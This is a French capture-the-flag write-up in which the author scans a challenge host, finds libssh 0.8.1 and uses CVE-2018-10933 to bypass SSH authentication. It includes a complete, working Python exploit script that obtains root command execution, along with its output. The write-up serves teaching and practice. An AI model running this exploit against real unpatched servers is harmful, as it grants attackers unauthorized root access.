# Hackerlab2019 – Rooter ?

* **Categorie:** Miscellaneous
* **Points:** 300

## Challenge

51.91.120.156<br>
30000

## Solution
Le nom de ce challenge nous a fait passer à obtenir l'accès <b>root</b> sur la machine ayant l'addresse IP <i>51.91.120.156</i>.

Lançons un scan rapide avec nmap pour obtenir plus d'informations sur les services qui tournent sur cette machine et plus précisement sur le port 30000.

```bash
lick@host:~/Bureau/HackerLab2019$ nmap -A 51.91.120.156 -p 30000
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-24 04:38 CET
Nmap scan report for 156.ip-51-91-120.eu (51.91.120.156)
Host is up (0.16s latency).

PORT      STATE SERVICE VERSION
30000/tcp open  ssh     libssh 0.8.1 (protocol 2.0)
| ssh-hostkey:
|_  2048 34:f3:32:c6:e8:50:23:6a:67:23:bd:58:a3:88:e3:a6 (RSA)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.18 seconds
```

Le résultat nous montre que sur le port 30000, il y a le service ssh qui fonctionne avec la version <b>libssh 0.8.1</b>. Cette version ssh semble être ancienne. Vérifions si elle ne présente aucune faille de sécurité.

Quelques recherches sur google, nous donne le sourit. En effet, une vulnérabilité (CVE-2018-10933) a été découverte dans libssh, c'est une bibliothèque codée en C implémentant le protocole SSH utilisé pour l’administration à distance des serveurs.

>Un défaut dans cette implémentation du protocole SSH permettait aux pirates de contourner les procédures d’authentification et d’avoir accès aux serveurs.<br>
Pour y parvenir, il suffisait qu’un attaquant émette le message <b>SSH2_MSG_USERAUTH_SUCCESS</b> au lieu de <b>SSH2_MSG_USERAUTH_REQUEST</b> que le serveur espère normalement lors du processus d’authentification d’un client.<br>
Ce message <b>SSH2_MSG_USERAUTH_SUCCESS</b> amenait le serveur ssh à penser que l’authentification avait déjà été confirmée et ce dernier offrait automatiquement l’accès à l’attaquant.<br>
Ce problème existe dans la version <b>libssh 0.6.0</b> et les versions suivantes. Seules les versions 0.7.6 et 0.8.4 ont été mises à jour jusque là.

Ainsi, avec cette information, notre objectif est d'exploiter cette vulnérabilité pour accéder de façon non-autorisé au serveur ayant l'IP <i>51.91.120.156</i>.

A l'aide de netcat, nous avons la confirmation que l'hôte <i>51.91.120.156</i> utilise une version vulnérable de libssh:
```bash
lick@host:~/Bureau/HackerLab2019$ netcat 51.91.120.156 30000
SSH-2.0-libssh_0.8.1
```

Grâce au script Python ci-dessous, nous tenterons d’exploiter la vulnérabilité CVE-2018-10933 sur l’hôte <i>51.91.120.156</i>.
```python
#!/usr/bin/env python

import sys
import socket
import paramiko

def main(hostname,port,cmd):

	try:

		s = socket.socket()
		s.connect((str(hostname),int(port)))
		msg = paramiko.message.Message()
		msg.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
		paramiko.util.log_to_file("filename.log")
		trans = paramiko.transport.Transport(s)
		trans.packetizer.REKEY_BYTES = pow(2, 40)
		trans.packetizer.REKEY_PACKETS = pow(2, 40)
		trans.start_client(timeout=5)
		trans._send_message(msg)
		session = trans.open_session(timeout=10)
		session.exec_command(cmd)
		out_file = session.makefile("rb",4096)
		output = out_file.read()
		print(output)
		out_file.close()
		s.close()
		return
	except Exception as e:
		print("Error")
		print(e)
		return


if __name__ == "__main__":
	try:
		hostname = sys.argv[1]
		port = sys.argv[2]
		cmd = sys.argv[3]
		main(hostname,port,cmd)
	except Exception as e:
		print("Usage: <script.py> <hostname> <port> <command>")
		exit()
```

Le script nous permet d’exécuter des codes sur l’hôte  <i>51.91.120.156</i> sans s’être authentifé sur le serveur ssh.

```bash
lick@host:~/Bureau/HackerLab2019$ python script.py 51.91.120.156 30000 id
uid=0(root) gid=0(root) groups=0(root)lick@host:~/Bureau/HackerLab2019$ python script.py 51.91.120.156 30000 id
uid=0(root) gid=0(root) groups=0(root)
```
Waou, nous avions pu accéder au serveur en étant `root` sur l’hôte  <i>51.91.120.156</i>  sans difficulté.

Essayons d'exécuter la commande <i>ls</i> afin de lister les fichiers sur le serveur que nous avons compromis.
```bash
lick@host:~/Bureau/HackerLab2019$ python script.py 51.91.120.156 30000 "ls"
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
ssh_server_fork.patch
sys
tmp
usr
var

```
Nous avons retouver un fichier nommé `flag.txt`. essayons de lire le contenu en exécutant la commande <i>cat</i>.
```bash
lick@host:~/Bureau/HackerLab2019$ python script.py 51.91.120.156 30000 "cat flag.txt"
CTF_SSH_Exploiter

```

Le flag de ce challenge est : `CTF_SSH_Exploiter`

Enjoy,<br>
\-[Kyb3R](https://twitter.com/LickosA)
